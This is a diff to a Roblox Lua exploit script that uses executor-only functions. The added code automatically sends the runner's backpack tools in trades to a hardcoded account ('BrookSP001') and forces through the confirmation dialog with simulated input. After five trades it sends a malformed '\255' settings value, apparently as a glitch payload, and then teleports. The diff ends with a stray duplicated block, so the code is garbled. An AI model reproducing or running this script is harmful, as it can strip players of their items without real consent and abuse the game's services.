@@ -2,14 +2,15 @@ local Players = game:GetService("Players")
 local GuiService = game:GetService("GuiService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Library = require(ReplicatedStorage.Library)
+local Library = require(ReplicatedStorage:WaitForChild("Library"))
 local Network = Library.get("Network")
 
--- รับค่าคอนฟิกจากภายนอก (ถ้าไม่มีให้ใช้ค่าเริ่มต้น)
+-- รับค่าคอนฟิกจากภายนอก
 local Config = getgenv().AcceptTradeConfig or {}
 local targetSenderName = Config.TargetSender or "BrookSP001"
 local allowedItems = Config.AllowedItems or {}
@@ -50,7 +51,6 @@ local function autoSendTradeLoop()
     local items = {}
     for _, item in ipairs(backpack:GetChildren()) do
         if item:IsA("Tool") then
-            -- ถ้ามีการตั้งค่า AllowedItems ให้กรองเฉพาะชิ้นที่มีอยู่ในลิสต์
             if next(allowedItems) == nil or allowedItems[item.Name] then
                 table.insert(items, item)
             end
@@ -89,6 +89,58 @@ local function autoSendTradeLoop()
     local confirmButton = nil
     local startTime = tick()
     
+    repeat
+        task.wait(0.02)
+        pcall(function()
+            areYouSureGui = playerGui:FindFirstChild("Tabs") and playerGui.Tabs:FindFirstChild("Are You Sure")
+            if areYouSureGui then
+                confirmButton = areYouSureGui.Menu.Frame.Buttons.Yes
+            end
+        end)
+    until (areYouSureGui and areYouSureGui.Enabled and confirmButton) or (tick() - startTime > 1)
+
+    if areYouSureGui and confirmButton then
+        while areYouSureGui.Parent and areYouSureGui.Enabled do
+            pcall(function()
+                if confirmButton and confirmButton.Parent then
+                    GuiService.SelectedObject = confirmButton
+                    
+                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+                    task.wait(0.02)
+                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+                    
+                    for _, conn in ipairs(getconnections(confirmButton.Activated)) do
+                        conn:Fire()
+                    end
+                end
+            end)
+            task.wait(0.08)
+        end
+
+        task.wait(0.1)
+        resetTradeUI()
+        
+        sentCount = sentCount + 1
+
+        if sentCount >= 5 then
+            pcall(function()
+                Network:FireServer("SaveSettings", {
+                    CameraShake = "\255"
+                })
+            end)
+            task.wait(0.5)
+            TeleportService:Teleport(game.PlaceId, player)
+            return
+        end
+
+        task.wait(0.2)
+    end
+end
+
+while true do
+    autoSendTradeLoop()
+    task.wait(0.1)
+end
     repeat
         task.wait(0.02)
         pcall(function()
